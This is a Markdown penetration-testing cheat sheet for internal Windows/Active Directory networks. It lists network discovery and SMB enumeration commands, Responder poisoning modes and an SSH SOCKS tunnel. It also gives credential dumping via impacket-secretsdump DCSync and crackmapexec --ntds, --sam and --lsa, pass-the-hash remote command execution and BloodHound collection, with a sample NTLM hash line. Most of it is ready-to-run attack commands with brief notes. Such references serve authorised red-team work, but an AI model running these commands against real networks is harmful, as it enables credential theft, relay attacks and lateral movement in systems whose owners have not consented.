# Network Information

## Passive

`arp -a`

`ip a`

`ifconfig / ipconfig`

`tcpdump -i eth0`

`netdiscover`

`hostname -I`

`hostname -d`

## Scanning

`nbtscan 192.168.1.1/24`

`nbtscan-unixwiz 192.168.1.1/24`

`nmap -sSV --open -iL ips.txt -oA output`

`sudo nmap --script broadcast-dhcp-discover`

`ping 255.255.255.255`

`masscan`

## Recon

`enum4linux -a <ip>`

`smbmap -H <ip>`

`crackmapexec smb <ip>`

`nxc smb <ip>`

Get IP and hostname

## Responder

### Analyze Mode
`responder -I eth0 -A`

`responder -I eth0 -wFP`

### Force Basic Auth
`responder -I eth0 -wbFP`

### DHCP
`responder -I eth0 -wdF`

## Inveigh


# SSH Tunneling

### Socks proxy
`ssh -D 8080 root@<ip>`

Set Firefox network settings to use socks5 proxy 127.0.0.1 8080, must remove the HTTP proxy if present

# Dumping

## DCSYNC

`impacket-secretsdump DOMAIN/user:password@IP -history -outputfile output`

Gets all password history too, useful for identifying patterns

`crackmapexec smb <ip> -u user -p password --ntds`

## Other

`crackmapexec smb <ip> -u user -p password --sam`

Local SAM passwords, NTLM

`crackmapexec smb <ip> -u user -p password --lsa`

Looks for LSASS secrets, includes tokens and plaintext passwords stored in memory.

# Bloodhound

Bloodhound collector

`git clone https://github.com/dirkjanm/BloodHound.py.git`

`BloodHound.py -u user -p passw -d domain -c all`


# crackmapexec

`crackmapexec smb <ip> -u user -p password -x 'whoami'`

-X for PowerShell, gets blocked by most systems

`crackmapexec smb <ip> -u user -H hash -x 'whoami'`

Pass the hash. This attack only works with NTLM hashes, not net hashes.

**Protocols**: {smb,rdp,winrm,ssh,ldap,mssql,ftp}

* **-u**: username
* **-p**: text password
* **--local-auth**: local auth, not domain auth
* **-x**: command execution
* **-X**: powershell command execution
  * Works better with winrm
* **-d**: domain

# netexec


# smbmap

* **-H**: host
* **--host-file**: hosts file
* **-u**: username
* **-p**: text password or NT:LM hash
* **-d**: domain


# Windows Hashes

## NTLM
Local user hash, can be relayed to hosts with SMB signing disabled.

`Admin:500:aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3:::`

Name:RID (relative identifier):LM hash:NT hash

## RID

* **500**: Administrator
* **501**: Guest
